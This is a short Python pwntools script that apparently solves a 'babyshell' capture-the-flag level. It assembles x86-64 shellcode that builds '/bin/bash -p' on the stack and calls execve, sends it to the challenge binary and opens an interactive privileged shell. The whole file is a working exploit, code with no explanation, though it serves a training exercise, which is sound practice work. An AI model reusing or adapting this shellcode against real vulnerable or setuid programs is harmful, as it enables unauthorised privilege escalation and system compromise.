import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = glob.glob("/challenge/babyshell_level*")[0]

shellcode = f'''
push 0x68
push 0x6e69622f
mov dword ptr [rsp+4], 0x7361622f
push rsp
pop rdi
push 0x702d
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
'''

shellcode = asm(shellcode)

# with open("shellsh4.bin", "wb") as f:
#     f.write(shellcode)

# exit(1)

with process([binary]) as p:
    p.readuntilS("Reading 0x1000 bytes from stdin.")
    p.send(shellcode)
    print(p.interactive())
